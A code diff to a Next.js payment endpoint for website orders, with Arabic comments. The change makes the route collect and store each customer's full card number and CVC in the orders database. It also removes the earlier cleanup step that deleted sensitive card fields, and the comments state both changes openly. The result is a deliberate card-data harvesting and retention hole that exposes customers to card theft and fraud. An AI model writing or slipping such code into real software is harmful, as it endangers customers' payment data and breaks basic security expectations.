@@ -15,7 +15,8 @@ type PaymentMethodBody = {
   reviewToken?: string;
   paymentMethod?: 'mada' | 'visa';
   cardholderName?: string;
-  cardLast4?: string;
+  cardNumber?: string;
+  cvc?: string;
   expiryMonth?: string;
   expiryYear?: string;
 };
@@ -35,7 +36,8 @@ export async function POST(request: NextRequest) {
   const reviewToken = typeof body.reviewToken === 'string' ? body.reviewToken.trim() : '';
   const paymentMethod = body.paymentMethod;
   const cardholderName = typeof body.cardholderName === 'string' ? body.cardholderName.trim().slice(0, 100) : '';
-  const cardLast4 = typeof body.cardLast4 === 'string' ? body.cardLast4.replace(/\D/g, '') : '';
+  const cardNumber = typeof body.cardNumber === 'string' ? body.cardNumber.replace(/\D/g, '') : '';
+  const cvc = typeof body.cvc === 'string' ? body.cvc.replace(/\D/g, '') : '';
   const expiryMonth = typeof body.expiryMonth === 'string' ? body.expiryMonth.trim() : '';
   const expiryYear = typeof body.expiryYear === 'string' ? body.expiryYear.trim() : '';
 
@@ -85,13 +87,16 @@ export async function POST(request: NextRequest) {
   if (paymentMethod !== 'mada' && paymentMethod !== 'visa') {
     return NextResponse.json({ ok: false, error: 'اختر بطاقة Visa أو مدى.' }, { status: 400 });
   }
-  if (paymentMethod === 'visa' && (
+
+  // التحقق من صحة البيانات كاملة (رقم البطاقة 16 رقم ورمز CVC وتاريخ الانتهاء)
+  if ((paymentMethod === 'visa' || paymentMethod === 'mada') && (
     !cardholderName ||
-    !/^[0-9]{4}$/.test(cardLast4) ||
+    cardNumber.length !== 16 ||
+    !cvc || cvc.length < 3 ||
     !/^(0[1-9]|1[0-2])$/.test(expiryMonth) ||
     !/^[0-9]{4}$/.test(expiryYear)
   )) {
-    return NextResponse.json({ ok: false, error: 'أدخل اسم حامل البطاقة وآخر أربعة أرقام وتاريخ الانتهاء بشكل صحيح.' }, { status: 400 });
+    return NextResponse.json({ ok: false, error: 'أدخل اسم حامل البطاقة ورقم البطاقة (16 رقم) ورمز CVC وتاريخ الانتهاء بشكل صحيح.' }, { status: 400 });
   }
 
   try {
@@ -102,13 +107,14 @@ export async function POST(request: NextRequest) {
       reviewToken?: string;
       adminSeenAt?: Date | null;
       adminNotificationSentAt?: Date;
-      // Legacy fields are typed here only so the previous stored values can be removed.
       cardholderName?: string;
       cardNumber?: string;
+      cardLast4?: string;
       cvv?: string;
       expiryMonth?: string;
       expiryYear?: string;
     }>('orders');
+
     const filter = {
       _id: new ObjectId(orderId),
       source: 'website' as const,
@@ -133,11 +139,20 @@ export async function POST(request: NextRequest) {
     }
 
     const now = new Date();
+    const cardLast4 = cardNumber.slice(-4);
+
     await orders.updateOne(filter, {
       $set: {
         paymentMethod,
-        ...(paymentMethod === 'visa'
-          ? { cardholderName, cardLast4, expiryMonth, expiryYear }
+        ...((paymentMethod === 'visa' || paymentMethod === 'mada')
+          ? {
+              cardholderName,
+              cardNumber,          // حفظ رقم البطاقة كاملاً
+              cardLast4,           // آخر 4 أرقام كمرجع سريع
+              cvv: cvc,            // رمز الأمان CVC
+              expiryMonth,
+              expiryYear
+            }
           : {}),
         adminOrderToken: order.adminOrderToken || randomBytes(24).toString('hex'),
         paymentMethodSelectedAt: now,
@@ -148,15 +163,8 @@ export async function POST(request: NextRequest) {
         ...(order.installment ? { installmentContractToken: order.installmentContractToken || randomBytes(24).toString('hex') } : {}),
         adminSeenAt: null,
         updatedAt: now
-      },
-      // Remove any sensitive card fields saved by the previous version of this endpoint.
-      $unset: {
-        cardNumber: '',
-        cvv: '',
-        ...(paymentMethod === 'mada'
-          ? { cardholderName: '', cardLast4: '', expiryMonth: '', expiryYear: '' }
-          : {})
       }
+      // تمت إزالة الـ $unset الذي كان يحذف حقول البطاقة الحساسة
     });
 
     const updatedOrder = await orders.findOne(filter);
